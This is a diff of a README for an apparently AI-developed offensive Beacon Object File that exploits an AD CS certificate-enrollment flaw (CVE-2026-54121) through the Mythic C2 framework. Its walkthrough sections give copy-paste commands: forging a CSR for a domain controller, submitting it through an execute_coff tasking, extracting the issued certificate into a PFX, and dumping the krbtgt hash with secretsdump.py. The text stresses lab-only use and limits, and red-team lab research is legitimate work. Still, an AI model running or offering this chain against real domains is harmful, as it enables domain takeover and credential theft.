@@ -2,192 +2,193 @@
 
 > **Disclosure:** This project was developed entirely by AI using the Hermes harness.
 
-Certighost is a Windows x64 Beacon Object File plus an offline operator CLI for the enrollment-only portion of the Certighost / CVE-2026-54121 lab chain. The BOF submits a caller-supplied in-memory PKCS#10 request through `ICertRequest::Submit` with `CR_IN_BINARY | CR_IN_PKCS10 | CR_IN_RPC`, then returns the disposition, request ID, and issued certificate bytes as base64 text over Beacon output.
+Certighost is a Windows x64 Beacon Object File for the enrollment-only portion of the Certighost / CVE-2026-54121 lab chain. It submits a caller-supplied in-memory PKCS#10 request through `ICertRequest::Submit` with `CR_IN_BINARY | CR_IN_PKCS10 | CR_IN_RPC`, then returns the disposition, request ID, and issued certificate bytes over Beacon output.
 
-This is REDANTONETTA lab-only work. No push, publication, deployment, live target execution, Mythic API tasking, listener automation, or broad DRS dumping is authorized from this repository.
+This is REDANTONETTA lab-only work. The BOF writes no target-side files and does not create machine accounts, start listeners, perform PKINIT, dump secrets, submit Mythic tasks, or automate rollback.
 
-## Human Operator Quick Start
+## Stock Mythic Walkthrough
 
-Use this only in an approved disposable Certighost lab with an already authorized Apollo callback and controlled callback listeners. The operator CLI never contacts Mythic or a target; it generates local secret material, emits one paste-ready Apollo command, validates exported output, and cleans only its own marked local run directory.
+Use this path only in an approved disposable Certighost lab with an already authorized Windows x64 Apollo callback and controlled callback listeners. It uses Apollo's stock `register_file` and stock `execute_coff` commands only. There is no custom Mythic command, alias, plugin, or API task submission in this repository.
 
-```sh
-make bof
-
-python3 -m tools.certighost_operator prepare \
-  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
-  --callback-id '<MYTHIC_CALLBACK_ID>' \
-  --agent-version '<EXACT_APOLLO_PAYLOAD_TYPE_VERSION>' \
-  --coff-object build/certighost.x64.o \
-  --ca-config '<CA_HOST>\<CA_NAME>' \
-  --template '<ENROLLABLE_MACHINE_TEMPLATE>' \
-  --target-dc '<TARGET_DC_FQDN>' \
-  --cdc '<CONTROLLED_LISTENER_FQDN_OR_IP>'
-```
-
-`prepare` creates the named run directory with mode `0700`, creates a fresh RSA private key with mode `0600`, writes a PKCS#10 CSR plus `task-descriptor.json`, and prints exactly one `execute_coff` command. Paste only that command into the authorized Apollo callback.
-
-After exporting the complete Mythic output to a local file:
-
-```sh
-python3 -m tools.certighost_operator extract \
-  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
-  --mythic-output '<EXPORTED_MYTHIC_OUTPUT_FILE>' \
-  --pfx
-```
-
-`extract` stores the captured output inside the marked run directory, rejects malformed or non-issued results, writes the issued certificate locally, and succeeds only when OpenSSL proves the certificate public key matches the run private key. `--pfx` optionally creates a transient local PFX and prompts twice for its password with hidden input. For non-interactive use, choose `--pfx-password-file '<0600_PASSWORD_FILE>'` or redirect a protected password file into `--pfx-password-stdin`; never put the PFX password on argv.
-
-```sh
-python3 -m tools.certighost_operator cleanup \
-  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>'
-```
-
-`cleanup` removes only known generated artifacts from that exact marked directory and reports unrelated files without deleting them.
-
-## Scope
-
-The BOF implements only the AD CS enrollment chase trigger. It does not create machine accounts, host rogue SMB/LSA or LDAP callback services, perform PKINIT, recover hashes, spawn a process, write any target-side file, submit Mythic tasks, or automate DRSUAPI. The operator CLI adds only local CSR/key generation, local output extraction, local certificate continuity verification, optional local PFX creation, and confined local cleanup.
-
-The rogue SMB/LDAP callback services described in [the research notes](docs/research/CVE-2026-54121.md) are external in-memory lab prerequisites. PKINIT and any post-certificate action are also external prerequisites and remain outside this repository.
-
-## Authorized Lab Walkthrough
-
-This walkthrough is copy-pasteable once placeholders are replaced with values from the approved disposable lab. Do not put credentials, runtime IDs, raw hashes, or secret file contents into documentation, chat, or evidence bundles.
-
-### 1. Prerequisites And Controlled Listeners
-
-Before preparing a task, verify all of the following:
-
-- The selected callback is Windows x64 and already has enrollment rights for the chosen template.
-- Apollo `execute_coff` is version `3` and the exact Apollo payload-type version is recorded for the descriptor.
-- The vulnerable Enterprise CA and enrollable template are inside the approved disposable lab only.
-- The controlled callback host is listening only on the approved lab paths required for the chase flow, typically TCP `445` and TCP `389`.
-- The target DC FQDN is the single intended certificate subject, SAN value, and remote-domain lookup value for this run.
-- The chosen run directory is new, operator-local, and disposable.
-
-Required listener evidence is constrained to listener state and callback metadata:
-
-```text
-<CONTROLLED_LISTENER_FQDN_OR_IP>:445 listening
-<CONTROLLED_LISTENER_FQDN_OR_IP>:389 listening
-```
-
-Do not retain authentication material obtained by external listeners.
-
-### 2. Build And Register The Reviewed BOF
+### 1. Build The Reviewed BOF
 
 ```sh
 make bof
 shasum -a 256 build/certighost.x64.o
 ```
 
-Compare the digest with the reviewed artifact record for the current commit. In the authorized Mythic operation, cache `build/certighost.x64.o` with Apollo's existing `register_file` or `register_coff` workflow and keep the cached object name `certighost.x64.o`. Do not use a target-side upload, shell copy, download, or certificate save path.
+Record the digest against the reviewed commit before using the object.
 
-### 3. Prepare One Operator Command
+### 2. Register The BOF In Mythic
 
-```sh
-python3 -m tools.certighost_operator prepare \
-  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
-  --callback-id '<MYTHIC_CALLBACK_ID>' \
-  --agent-version '<EXACT_APOLLO_PAYLOAD_TYPE_VERSION>' \
-  --coff-object build/certighost.x64.o \
-  --ca-config '<CA_HOST>\<CA_NAME>' \
-  --template '<ENROLLABLE_MACHINE_TEMPLATE>' \
-  --target-dc '<TARGET_DC_FQDN>' \
-  --cdc '<CONTROLLED_LISTENER_FQDN_OR_IP>'
-```
-
-The CLI may prompt for omitted required values, but it never invents a run directory. Always provide or enter a fresh explicit run directory. Supplying `--agent-version` is recommended for retained evidence; if omitted, the descriptor records `operator-unspecified` rather than guessing a live version.
-
-The first output line is the only line to paste into Mythic. The remaining lines label local secrets and the next constrained step. Review `task-descriptor.json` before execution.
-
-### 4. Paste One Command Into Mythic
-
-Paste the single generated line into the already authorized Apollo callback. It invokes only:
+In the authorized Apollo callback, run the stock command:
 
 ```text
-execute_coff -Coff certighost.x64.o -Function go -Timeout <SECONDS> -Arguments <SIX_TYPED_ARGUMENTS>
+register_file
 ```
 
-Preserve the Mythic task ID and output IDs as evidence, but do not place them in persistent documentation. Save the complete exported output to a local text file after the task finishes.
+Use Mythic's file picker to select `build/certighost.x64.o` from the operator workstation. Keep the registered filename `certighost.x64.o`. Then confirm that the `execute_coff` `-Coff` picker shows `certighost.x64.o`. This is an in-memory BOF registration path; do not upload or save anything on the target.
 
-### 5. Extract And Verify The Issued Certificate
+### 3. Generate A Fresh Key And CSR Locally
+
+Use OpenSSL and shell only. The private key stays in an operator-local ephemeral directory and must remain paired with the issued certificate.
 
 ```sh
-python3 -m tools.certighost_operator extract \
-  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
-  --mythic-output '<EXPORTED_MYTHIC_OUTPUT_FILE>' \
-  --pfx
+umask 077
+export RUN_DIR="$HOME/RedAntonetta/artifacts/certighost-run"
+mkdir -p "$RUN_DIR"
+
+openssl req -new -newkey rsa:2048 -nodes \
+  -keyout "$RUN_DIR/target-dc.key.pem" \
+  -out "$RUN_DIR/target-dc.csr.pem" \
+  -subj '/CN=ra-dc01.certighost.redantonetta.test' \
+  -addext 'subjectAltName=DNS:ra-dc01.certighost.redantonetta.test'
+
+openssl req -in "$RUN_DIR/target-dc.csr.pem" -outform DER \
+  -out "$RUN_DIR/target-dc.csr.der"
+openssl req -in "$RUN_DIR/target-dc.csr.pem" -noout -verify -subject
+
+openssl base64 -A -in "$RUN_DIR/target-dc.csr.der" > "$RUN_DIR/target-dc.csr.der.b64"
 ```
 
-The command copies the exported output into the marked run directory, parses only the documented Certighost framing, writes `issued-cert.der` and `issued-cert.pem`, compares OpenSSL SHA-256 SPKI digests for the certificate and private key, and optionally creates `issued-cert.pfx`. Choose exactly one PFX mode: `--pfx` uses a hidden password-and-confirmation prompt, `--pfx-password-file` accepts only a regular file with no group or other permission bits, and `--pfx-password-stdin` reads one password line from redirected stdin. It fails closed on malformed output, non-issued disposition, invalid DER, missing key continuity, unmarked directories, symlinks, or an already completed certificate extraction.
+Open `$RUN_DIR/target-dc.csr.der.b64` and copy its single line for the first argument below. Do not base64-encode the five text values.
 
-### 6. External PKINIT Handoff
+### 4. Run One Mixed `execute_coff` Command
 
-PKINIT stays external to this repository. After a successful `extract`, hand the transient PFX only to an approved external harness that accepts a protected password file, redirected stdin, or its own hidden prompt. Do not translate the PFX password back into an argv-only invocation. The exact external command is intentionally omitted because this repository does not own that password transport.
+Apollo `execute_coff` v3 must receive one `base64` argument followed by five `string` arguments in this exact order:
 
-Retain only sanitized success metadata such as the principal and whether a TGT was obtained. Keep any ccache ephemeral and out of reports and commits.
+```text
+csr_der, ca_config, template, san_dns, cdc, rmd
+```
 
-### 7. Prove Krbtgt-Only DRSUAPI Authority
+Paste one command into the authorized callback. This sanitized concrete example shows the full mixed shape; replace only `<PASTE_CSR_DER_B64>` with the single-line CSR value generated above.
 
-Use the TGT only for the separately authorized one-account impact proof:
+```text
+execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:<PASTE_CSR_DER_B64> string:ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA string:Machine string:ra-dc01.certighost.redantonetta.test string:ra-listener.certighost.redantonetta.test string:ra-dc01.certighost.redantonetta.test
+```
+
+The text values in that example mean:
+
+| Position | Field | Example |
+| --- | --- | --- |
+| 1 | `csr_der` | Base64 of the raw DER CSR bytes |
+| 2 | `ca_config` | `ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA` |
+| 3 | `template` | `Machine` |
+| 4 | `san_dns` | `ra-dc01.certighost.redantonetta.test` |
+| 5 | `cdc` | `ra-listener.certighost.redantonetta.test` |
+| 6 | `rmd` | `ra-dc01.certighost.redantonetta.test` |
+
+`san_dns` may be empty when the approved lab case requires no SAN. `ca_config`, `template`, `cdc`, and `rmd` are required.
+
+### 5. Read The Result
+
+A vulnerable lab CA returns an issued result and a framed base64 certificate:
+
+```text
+CERTIGHOST_RESULT disposition=3 request_id=41 cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
+<base64 DER certificate>
+CERTIGHOST_CERT_END
+```
+
+Apollo commonly aggregates the result header directly with `CERTIGHOST_CERT_BEGIN`; that missing newline is expected.
+
+A patched negative control returns no certificate block:
+
+```text
+certighost: request not issued (disposition=2 request_id=42 last_status=0x80094800)
+certighost: CA message: The request was denied.
+```
+
+Stop if the disposition is not `3`. Preserve only sanitized task/output identifiers and the approved evidence records.
+
+### 6. Extract The Certificate And Prove Key Continuity
+
+Save the complete Mythic output as `$RUN_DIR/mythic-output.txt`, then extract the certificate locally:
 
 ```sh
-KRB5CCNAME='<NEW_EPHEMERAL_RUN_DIRECTORY>/target-dc.ccache' \
+awk '/CERTIGHOST_CERT_BEGIN/{capture=1;next}/CERTIGHOST_CERT_END/{capture=0}capture' \
+  "$RUN_DIR/mythic-output.txt" | tr -d '[:space:]' | \
+  openssl base64 -d -A -out "$RUN_DIR/issued-cert.der"
+
+openssl x509 -inform DER -in "$RUN_DIR/issued-cert.der" \
+  -out "$RUN_DIR/issued-cert.pem"
+openssl x509 -in "$RUN_DIR/issued-cert.pem" -noout \
+  -subject -issuer -serial -ext subjectAltName
+
+openssl pkey -in "$RUN_DIR/target-dc.key.pem" -pubout -outform DER | \
+  openssl dgst -sha256
+openssl x509 -in "$RUN_DIR/issued-cert.pem" -pubkey -noout | \
+  openssl pkey -pubin -outform DER | openssl dgst -sha256
+```
+
+The two SHA-256 SPKI digests must match. If they do not match, do not use the certificate.
+
+Create a transient PFX only after continuity is proven. Omitting `-passout` uses OpenSSL's hidden export-password prompt without exposing it on argv.
+
+```sh
+openssl pkcs12 -export \
+  -inkey "$RUN_DIR/target-dc.key.pem" \
+  -in "$RUN_DIR/issued-cert.pem" \
+  -out "$RUN_DIR/issued-cert.pfx"
+chmod 600 "$RUN_DIR/issued-cert.pfx"
+```
+
+### 7. Keep Downstream Scope To `krbtgt` Only
+
+PKINIT and replication proof stay outside this repository. If the separately approved harness obtains a TGT from the transient PFX, use it only for the one-account proof:
+
+```sh
+KRB5CCNAME="$RUN_DIR/target-dc.ccache" \
   secretsdump.py -k -no-pass -just-dc-user 'krbtgt' \
-  '<AD_REALM>/<TARGET_DC_NETBIOS>$@<TARGET_DC_FQDN>'
+  'REDANTONETTA.TEST/RA-DC01$@ra-dc01.certighost.redantonetta.test'
 ```
 
-Do not remove `-just-dc-user 'krbtgt'`. Do not request additional accounts. Do not perform a broad dump. Record only sanitized proof that exactly one account was requested, the result count was `1`, the RID was `502`, an NT hash was present, and `broad_dump_performed` was `false`.
+Do not remove `-just-dc-user 'krbtgt'`, request additional accounts, or perform a broad dump. Retain only sanitized evidence that one account was requested, the result count was `1`, the RID was `502`, an NT hash was present, and `broad_dump_performed` was `false`.
 
-### 8. Local Cleanup And Lab Rollback
+### 8. Clean Up Local Secrets And Roll Back The Lab
 
-Stop external listeners, destroy any external ccache or replication output, then remove only this CLI's generated local artifacts:
+Stop the external listeners and remove the operator-local artifacts created for this run:
 
 ```sh
-python3 -m tools.certighost_operator cleanup \
-  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>'
+rm -f "$RUN_DIR/target-dc.key.pem" \
+      "$RUN_DIR/target-dc.csr.pem" \
+      "$RUN_DIR/target-dc.csr.der" \
+      "$RUN_DIR/target-dc.csr.der.b64" \
+      "$RUN_DIR/issued-cert.der" \
+      "$RUN_DIR/issued-cert.pem" \
+      "$RUN_DIR/issued-cert.pfx" \
+      "$RUN_DIR/target-dc.ccache" \
+      "$RUN_DIR/mythic-output.txt"
+rmdir "$RUN_DIR" 2>/dev/null || true
 ```
 
-The cleanup command refuses `/`, the operator home directory, the repository root, symlink directories, symlink files, and directories without the exact Certighost marker. It leaves unrelated files in place and reports them.
+Then use the approved disposable-lab rollback workflow for the DC and CA snapshots. A later validation must use a fresh callback, CSR, key, and run directory.
 
-Revert the disposable lab systems through the approved rollback workflow:
+## Argument Contract
 
-```sh
-ludus snapshots revert '<DC_PRE_PKINIT_SNAPSHOT>' --vmids '<DC_VMID>'
-ludus snapshots revert '<CA_PRE_VALIDATION_SNAPSHOT>' --vmids '<CA_VMID>'
+Apollo `execute_coff` v3 packs the mixed typed array as one outer little-endian `u32` payload length followed by six length-prefixed slices. The first `base64` entry is decoded raw DER. Each `string` entry is UTF-8 bytes plus exactly one terminal NUL inside its slice length.
+
+```text
+[base64, csr_der_b64]
+[string, ca_config]
+[string, template]
+[string, san_dns]
+[string, cdc]
+[string, rmd]
 ```
 
-Verify that temporary trust, KDC, certificate, callback, listener, and request state is gone before closing the run. A later validation must use a fresh callback, CSR, key, and run directory.
+The BOF strips exactly one terminal NUL from each text slice before validation and use. It rejects embedded NULs, empty required text after normalization, malformed framing, truncation, trailing bytes, extra arguments, and invalid field order. For compatibility with older packed callers, valid legacy all-base64 text slices without terminal NULs are still accepted.
 
-## BOF Argument Contract
+| Field | Validation |
+| --- | --- |
+| `csr_der` | Non-empty, at most 256 KiB, bounded outer DER `SEQUENCE`; arbitrary DER bytes are preserved |
+| `ca_config` | ASCII `host\CAName`, at most 512 bytes |
+| `template` | Visible ASCII without `:` or newlines, at most 128 bytes |
+| `san_dns` | Optional empty value, otherwise DNS/IP-like ASCII, at most 255 bytes |
+| `cdc` | Required DNS/IP-like ASCII, at most 255 bytes |
+| `rmd` | Required DNS/IP-like ASCII, at most 255 bytes |
 
-The `go` entrypoint expects the standard Beacon `bof_pack` frame: one little-endian `u32` payload length followed by six little-endian length-prefixed binary fields. Apollo `execute_coff` v3 passes that frame intact:
-
-```sleep
-$args = bof_pack($bid, "bbbbbb",
-    $csr_der,
-    $ca_config,
-    $template,
-    $san_dns,
-    $cdc,
-    $rmd);
-```
-
-Fields are ordered as follows:
-
-| Position | Field | Meaning | Validation |
-| --- | --- | --- | --- |
-| 1 | `csr_der` | DER PKCS#10 request bytes | Non-empty, at most 256 KiB, bounded outer DER `SEQUENCE` |
-| 2 | `ca_config` | CA configuration string such as `<CA_HOST>\<CA_NAME>` | ASCII `host\CAName`, at most 512 bytes |
-| 3 | `template` | Certificate template value | Printable ASCII without `:` or newlines, at most 128 bytes |
-| 4 | `san_dns` | DNS SAN value without the `dns=` prefix | Optional empty field, otherwise DNS/IP-like ASCII, at most 255 bytes |
-| 5 | `cdc` | Chase callback host/IP value | Required DNS/IP-like ASCII, at most 255 bytes |
-| 6 | `rmd` | Remote-domain/principal lookup DNS value | Required DNS/IP-like ASCII, at most 255 bytes |
-
-`prepare` maps `--target-dc` to both `san_dns` and `rmd`, generates the fresh CSR locally, and passes the raw six fields into `build_task_descriptor` and `validate_task_descriptor`. Operators do not hand-base64 encode any field. The descriptor primitive owns the typed `base64:` conversion and validates the exact six-field order plus the intact Apollo frame; pre-encoding a field would change the bytes seen by the BOF and break the validated contract.
-
-The BOF constructs this exact attribute string in memory:
+The in-memory attributes remain:
 
 ```text
 CertificateTemplate:<template>
@@ -198,41 +199,18 @@ rmd:<rmd>
 
 The `SAN:dns=` line is omitted only when `san_dns` is empty.
 
-## Output And Expected Results
+## Optional Offline Helpers
 
-On issuance, the BOF emits a text header and a base64-framed DER certificate:
+`tools/certighost_mythic.py` and `tools/certighost_operator.py` are optional offline helpers for descriptor generation, fixture validation, local extraction, and test coverage. They do not contact Mythic or a target, and they are not required for the stock walkthrough above.
 
-```text
-CERTIGHOST_RESULT disposition=3 request_id=<id> cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
-<base64 DER certificate>
-CERTIGHOST_CERT_END
+Apollo's stock typed-array CLI splits argument tokens on spaces. The optional helpers therefore refuse text values containing spaces or edge quotes instead of emitting an operator command that would not reproduce the recorded frame; the BOF ABI itself remains compatible with otherwise valid packed text slices.
+
+```sh
+PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
+  validate-evidence tests/fixtures/mythic/vulnerable-success.json
+PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
+  validate-evidence tests/fixtures/mythic/patched-negative-control.json
 ```
-
-Apollo aggregates the issued `BeaconPrintf` header directly with the next `BeaconOutput` marker, so the canonical exported text has no newline between `cert_base64_chars=<n>` and `CERTIGHOST_CERT_BEGIN`. No output field is a filesystem path. For a denied, pending, or failed submission, the BOF emits the disposition, request ID when available, last status HRESULT when available, and a sanitized CA disposition message. Input validation failures occur before COM enrollment is attempted.
-
-Expected vulnerable result:
-
-- `CERTIGHOST_RESULT disposition=3` is present.
-- A single certificate block is present and `extract` verifies certificate/private-key continuity.
-- The controlled listener evidence shows the expected lab callback path.
-- The later PKINIT and krbtgt-only proof use only the transient local secrets created for that run.
-
-Expected patched negative control:
-
-- The BOF emits `certighost: request not issued (...)` rather than a certificate block.
-- `extract` exits non-zero and does not write certificate or PFX artifacts.
-- The controlled listener evidence shows no chase callback.
-- No PKINIT or DRS proof is attempted.
-
-## Troubleshooting
-
-- `openssl was not found in PATH`: install or select a local OpenSSL-compatible binary before running `prepare` or `extract`.
-- `run directory already exists`: choose a new explicit directory; a run never reuses an old secret workspace.
-- `ca_config must be ASCII host\CAName`: pass exactly one backslash between the CA host and CA name, with no slash, colon, or newline.
-- `certificate was not issued`: retain the request ID and CA status as evidence, correct only the authorized lab prerequisite, and start a fresh run.
-- `issued certificate public key does not match the run private key`: stop immediately; do not use the certificate or PFX for PKINIT.
-- `directory is not the exact marked Certighost run directory`: use the original run directory created by `prepare`; do not rename, symlink, or substitute directories.
-- `symlink path is not allowed`: replace the symlink with a direct regular file or directory inside the operator-local run workspace.
 
 ## Build And Test
 
@@ -244,23 +222,10 @@ make imports
 git diff --check
 ```
 
-`make bof` prefers `x86_64-w64-mingw32-gcc` when present. In this worktree it falls back to the installed LLVM clang cross-target path and emits `build/certighost.x64.o` as `coff-x86-64`. `make test` builds and runs the macOS host harness plus the offline Mythic packing, task-schema, output, filesystem-evidence, repeatability, cleanup, and operator workflow tests.
+`make bof` prefers `x86_64-w64-mingw32-gcc` when present and otherwise uses the installed LLVM clang cross-target path. `make test` runs the host-side parser harness and offline Python workflow tests.
 
-## Recovery
+## Documentation
 
-If the CA returns a non-issued disposition, retain the reported request ID and CA message as evidence and correct the lab prerequisite or request input before rerunning. The BOF does not retrieve pending requests later, persist certificates on the victim, or attempt any recovery action that changes target state.
-
-## Research
-
-- [CVE-2026-54121 / Certighost primary-source research](docs/research/CVE-2026-54121.md)
-
-## Mythic Integration
-
-- [Offline Apollo execute_coff v3 workflow and evidence validation](docs/mythic-integration.md)
+- [Offline Apollo execute_coff v3 integration](docs/mythic-integration.md)
 - [Sanitized manual full-chain validation](docs/manual-full-chain-validation.md)
-
-## Lab Design
-
-- [REDANTONETTA declarative lab runbook](docs/lab/CVE-2026-54121-redantonetta-runbook.md)
-- [Ludus range config](ludus/ranges/redantonetta-certighost.yml)
-- [Local Certighost lab role](ludus/roles/certighost_lab)
+- [CVE-2026-54121 / Certighost research](docs/research/CVE-2026-54121.md)
